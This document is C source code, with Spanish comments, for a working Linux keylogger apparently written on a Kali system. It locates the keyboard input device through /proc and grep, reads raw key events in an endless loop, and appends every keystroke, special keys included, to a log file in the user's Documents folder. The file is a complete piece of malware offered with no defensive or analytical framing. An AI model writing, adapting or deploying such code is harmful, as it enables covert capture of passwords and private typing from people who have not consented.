
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>

#define LOGFILEPATH "/home/kali/Documents/keylogger.txt"

char *getEvent();
char *keycodeToChar(int code);

int main() {
    struct input_event ev;
    // ruta al directorio de inputs
    static char path_keyboard[20] = "/dev/input/";
    // concatenar variable keyboard
    strcat(path_keyboard, getEvent());
     // eliminar último caracter (breakline)
    path_keyboard[strlen(path_keyboard)-1] = 0;
    // leer ruta a input

    int device_keyboard = open(path_keyboard, O_RDONLY);
    if (device_keyboard == -1) {
        perror("Error al abrir el dispositivo de entrada");
        return -1;
    }

    FILE *fp = fopen(LOGFILEPATH, "a");
    if (fp == NULL) {
        perror("Error al abrir el archivo de log");
        return -1;
    }

    while (1) {
        read(device_keyboard, &ev, sizeof(ev));
        if (ev.type == EV_KEY && ev.value == 0) {  // 0 significa que la tecla fue liberada
            char *key = keycodeToChar(ev.code);
            if (key != NULL) {
                fprintf(fp, "%s", key);
                fflush(fp);
            }
        }
    }

    fclose(fp);
    close(device_keyboard);
    return 0;
}

char *getEvent() {
    char *command =  "cat /proc/bus/input/devices | grep -C 5 keyboard | grep -E -o 'event[0-9]'";
    static char event[8];
    FILE *pipe = popen(command, "r");
    if (!pipe)
        exit(1);
    fgets(event, 8, pipe);
    pclose(pipe);
    return event;
}
//Hecho por Jose David
char *keycodeToChar(int code) {
    static char key[12]; // Espacio para teclas especiales
    switch(code) {
        case 2: return "1";
        case 3: return "2";
        case 4: return "3";
        case 5: return "4";
        case 6: return "5";
        case 7: return "6";
        case 8: return "7";
        case 9: return "8";
        case 10: return "9";
        case 11: return "0";
        case 12: return "-";
        case 13: return "=";
        case 14: return "[BACKSPACE]";
        //no robar xd
        case 15: return "[TAB]";
        case 16: return "q";
        case 17: return "w";
        case 18: return "e";
        case 19: return "r";
        case 20: return "t";
        case 21: return "y";
        case 22: return "u";
        case 23: return "i";
        case 24: return "o";
        case 25: return "p";
        case 26: return "[";
        case 27: return "]";
        case 28: return "[ENTER]";
        case 30: return "a";
        case 31: return "s";
        case 32: return "d";
        case 33: return "f";
        case 34: return "g";
        case 35: return "h";
        case 36: return "j";
        case 37: return "k";
        case 38: return "l";
        case 39: return ";";
        case 40: return "'";
        case 41: return "`";
        case 42: return "[SHIFT]";
        case 43: return "\\";
        case 44: return "z";
        case 45: return "x";
        case 46: return "c";
        case 47: return "v";
        case 48: return "b";
        case 49: return "n";
        case 50: return "m";
        case 51: return ",";
        case 52: return ".";
        case 53: return "/";
        case 57: return " ";
        case 58: return "[CAPSLOCK]";
        case 59: return "[F1]";
        case 60: return "[F2]";
        case 61: return "[F3]";
        case 62: return "[F4]";
        case 63: return "[F5]";
        case 64: return "[F6]";
        case 65: return "[F7]";
        case 66: return "[F8]";
        case 67: return "[F9]";
        case 68: return "[F10]";
        case 69: return "[NUMLOCK]";
        case 70: return "[SCROLLLOCK]";
        case 87: return "[F11]";
        case 88: return "[F12]";
        default:
            snprintf(key, 12, "[UNK_%d]", code);  // Tecla desconocida
            return key;
    }
}
//hecho el 15/08/2024
